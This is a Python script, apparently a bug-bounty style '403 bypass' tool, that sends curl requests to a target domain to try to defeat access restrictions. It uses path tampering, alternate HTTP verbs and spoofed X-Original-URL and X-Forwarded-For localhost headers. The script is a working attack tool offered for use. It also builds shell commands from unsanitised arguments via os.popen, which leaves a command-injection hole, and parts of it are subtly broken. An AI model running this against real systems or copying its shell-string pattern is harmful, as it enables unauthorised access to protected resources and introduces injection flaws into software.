#!/usr/bin/python3

import sys
import argparse
from os import popen
from pathlib import Path

parser = argparse.ArgumentParser()

parser.add_argument("-d", "--domain", type=str, required=True, help="target domain")
parser.add_argument("-p", "--path", type=Path, required=True, help="File path dontains paths to bypass")
parser.add_argument("-xh", "--header", type=str, required=False, help="Extra header")
args = parser.parse_args()

# TODO list
# some color

banner = r"""

	██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗
	██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██╔═████╗╚██╗██╔╝
	██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗███████║██║██╔██║ ╚███╔╝ 
	██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║╚════██║████╔╝██║ ██╔██╗ 
	██████╔╝   ██║   ██║     ██║  ██║███████║███████║     ██║╚██████╔╝██╔╝ ██╗
	╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝
	                                                                by 0verread """

def make_curl_request(url):
	curl_req = "curl -k -s -I %s"%(url)
	code = popen("%s | grep HTTP"%(curl_req)).read()
	return curl_req, code

def get_http_verbs():
	verbs_dict = {
		'get' : '-X GET',
		'post' : '-X POST',
		'trace' : '-X TRACE',
		'patch"': '-X PATCH',
		'put' : '-X PUT'
	}

	return verbs_dict

def get_headers(domain, path):
	headers = {
		'x-forwarded-for' : f'-H X-Forwarded-For: 127.0.0.1:80',
		'x-rewrite-url' : f'-H X-rewrite-url: {path}',
		'x-original-url' : f'-H X-Original-URL: {path}',
		'x-forwarded-for-lh' : f'-H X-Forwarded-For: http://127.0.0.1',
	}

	return headers

def get_urls(domain, path, extra_header=None):
	urls = []
	http_verbs = get_http_verbs()
	headers = get_headers(domain, path)

	# path temper
	urls.append(f"{domain}{path}")
	urls.append(f"{domain}{path}/.")
	urls.append(f"{domain}/{path}//")
	urls.append(f"{domain}/.{path}/./")
	urls.append(f"{domain}/%2e{path}")
	urls.append(f"{domain}{path}%20")
	urls.append(f"{domain}{path}.html")
	urls.append(f"{domain}{path}.php")

	# HTTP verbs 
	urls.append(f"{http_verbs['post']} {domain}{path}")
	urls.append(f"{http_verbs['trace']} {domain}{path}")
	urls.append(f"{http_verbs['get']} {domain}{path}")
	urls.append(f"{http_verbs['put']} {domain}{path}")

	# headers
	urls.append(f"{domain} {headers['x-rewrite-url']}")
	urls.append(f"{domain}{path} {headers['x-original-url']}")
	urls.append(f"{domain}{path} {headers['x-forwarded-for']}")
	urls.append(f"{domain}{path} {headers['x-forwarded-for-lh']}")

	# add extra header if provided
	if not extra_header is None:
		for i in range(len(urls)):
			urls[i] = urls[i] + ' -H ' + extra_header

	return urls

def do_bypass(urls):
	for url in urls:
		curl_req, code  = make_curl_request(url)
		status_code = code.split( " ")[1]
		print(f"{status_code} : {curl_req}")

def request_handler(domain, paths, extra_header=None):
	if domain is None:
		print(f"How the hell did you bypass required argument?? Lemme know.")
		sys.exit(1)

	if len(paths) == 0:
		print(f"No path added in pathlist file")
		sys.exit(1)
	else:
		for path in paths:
			urls = get_urls(domain, path, extra_header)
			do_bypass(urls)

def main():
	domain = args.domain
	pathlist  = args.path
	extra_header = args.header

	if not domain.startswith("http://") and not domain.startswith("https://"):
		print(f"URL parameter doesn't start  with http or https")
		sys.exit(1)

	with open(pathlist) as file:
		paths = [path.rstrip() for path in file]
	
	if len(paths) == 0:
		print(f"Path file is empty. Add minimun one path.")
		sys.exit(1)
	else:
		request_handler(domain, paths, extra_header)

if __name__ == "__main__" :
	print(banner)
	main()

